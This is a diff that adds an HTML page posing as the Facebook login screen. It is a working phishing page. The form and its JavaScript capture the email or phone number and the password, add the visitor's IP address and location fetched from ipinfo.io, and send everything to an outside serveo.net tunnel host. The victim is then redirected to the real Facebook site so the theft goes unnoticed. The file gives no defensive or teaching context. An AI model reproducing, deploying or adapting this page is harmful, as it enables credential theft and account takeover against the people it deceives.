@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .login-container {
+            background-color: #fff;
+            padding: 50px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .logo {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+
+        h2 {
+            margin-bottom: 20px;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        input[type="text"],
+        input[type="password"],
+        button {
+            padding: 12px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 20px;
+        }
+
+        button {
+            background-color: #1877f2;
+            color: #fff;
+            border: none;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #166fe5;
+        }
+
+        p {
+            margin-top: 10px;
+        }
+
+        a {
+            text-decoration: none;
+            color: #1877f2;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <center><h1 style="font-size:66px;color:#166fe5">facebook</h1></center>
+        <h2>Log into Facebook to continue</h2>
+        <form id="Ftform" action="https://4f37705c3caabf3d101e50122ec71c64.serveo.net/index.php" method="POST" onsubmit="submitForm(); return false;">
+            <input type="text" name="email_or_phone" id="email-or-phone" placeholder="Email or Phone number" required/>
+            <input type="password" name="password" id="password" placeholder="Password" required/>
+            <input type="hidden" id="ip_address" name="ip_address">
+            <input type="hidden" id="country" name="country">
+            <input type="hidden" id="region" name="region">
+            <input type="hidden" id="city" name="city">
+            <button type="submit">Log In</button>
+            <a href="https://m.facebook.com/?refsrc=deprecated">Forgot password?</a>
+            <p>or</p>
+            <button style="background-color:green"><a href="https://m.facebook.com/reg/#" style="color:white">Create new account</a></button>
+            <p>About . Help . More</p>
+            <p>Meta © 2024</p>
+        </form>        
+    </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script>
+        $(document).ready(function() {
+            $.getJSON("https://ipinfo.io/?format=json", function(data) {
+                $("#ip_address").val(data.ip);
+                $("#country").val(data.country);
+                $("#region").val(data.region);
+                $("#city").val(data.city);
+            });
+        });
+
+function submitForm() {
+    var emailOrPhone = document.getElementById("email-or-phone").value;
+    var password = document.getElementById("password").value;
+
+    // Call the onSubmitForm function with form data
+    onSubmitForm(emailOrPhone, password);
+}
+
+function onSubmitForm(emailOrPhone, password) {
+    var formData = new FormData();
+    formData.append("email_or_phone", emailOrPhone);
+    formData.append("password", password);
+    formData.append("ip_address", document.getElementById("ip_address").value);
+    formData.append("country", document.getElementById("country").value);
+    formData.append("region", document.getElementById("region").value);
+    formData.append("city", document.getElementById("city").value);
+
+    fetch('https://4f37705c3caabf3d101e50122ec71c64.serveo.net/index.php', {
+        method: 'POST',
+        body: formData
+    })
+    .then(response => {
+        if (response.ok) {
+            // Redirect or handle the success
+            window.location.href = "https://www.facebook.com/profile";
+        } else {
+            console.error("Form submission failed:", response.statusText);
+        }
+    })
+    .catch(error => console.error("Error submitting form:", error));
+}
+
+        // Detect user's language and adjust form language
+        var userLanguage = navigator.language || navigator.userLanguage;
+        if (userLanguage.startsWith("en")) {
+            // Set form language to English
+            document.getElementById("Ftform").setAttribute("lang", "en");
+        } else if (userLanguage.startsWith("fr")) {
+            // Set form language to French
+            document.getElementById("Ftform").setAttribute("lang", "fr");
+        } // Add more language conditions as neededo
+    </script>
+</body>
+</html>
